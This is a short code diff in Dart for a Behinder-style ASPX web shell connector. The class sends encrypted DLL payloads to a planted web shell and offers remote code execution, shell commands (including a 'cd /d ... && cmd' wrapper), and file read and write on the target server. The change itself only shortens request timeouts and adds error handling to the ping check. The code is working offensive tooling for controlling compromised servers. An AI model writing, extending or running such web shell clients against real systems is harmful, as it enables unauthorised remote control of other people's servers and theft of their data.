@@ -45,7 +45,7 @@ class AspxBehinderConnector extends ShellConnector {
       final d = await _load(dll); if (d.isEmpty) return '[Error] $dll';
       final s = utf8.encode('~~~~~~${_params(p)}');
       final body = _enc(Uint8List(d.length + s.length)..setAll(0, d)..setAll(d.length, s));
-      final r = await _client.post(Uri.parse(webshell.url), headers: _h, body: body).timeout(const Duration(seconds: 25));
+      final r = await _client.post(Uri.parse(webshell.url), headers: _h, body: body).timeout(const Duration(seconds: 10));
       _ck(r); if (r.statusCode != 200) return '[HTTP ${r.statusCode}]';
       final dec = _decBytes(r.bodyBytes);
       return dec != null ? BehinderCrypto.extractResponse(dec) : decodeWithFallback(r.bodyBytes);
@@ -55,7 +55,13 @@ class AspxBehinderConnector extends ShellConnector {
   @override Set<ConnectorCapability> get capabilities => const { ConnectorCapability.codeExec, ConnectorCapability.shellExec, ConnectorCapability.fileRead, ConnectorCapability.fileWrite };
   @override String? get lastPingDiagnostic => _lastPingDiagnostic;
 
-  @override Future<bool> ping() async { final r = await _send('Echo', {'content': 'MATRIX_ASPNET_PING'}); if (r.contains('MATRIX_ASPNET_PING')) { _lastPingDiagnostic = null; return true; } _lastPingDiagnostic = r; return false; }
+  @override Future<bool> ping() async {
+    try {
+      final r = await _send('Echo', {'content': 'MATRIX_ASPNET_PING'}).timeout(const Duration(seconds: 10));
+      if (r.contains('MATRIX_ASPNET_PING')) { _lastPingDiagnostic = null; return true; }
+      _lastPingDiagnostic = r; return false;
+    } catch (e) { _lastPingDiagnostic = e.toString(); return false; }
+  }
 
   @override Future<String> executeCommand(String cmd, {String workingDir = ''}) async { final c = workingDir.isNotEmpty ? 'cd /d "$workingDir" && $cmd' : cmd; return (await _send('Cmd', {'cmd': c})).trim(); }
 
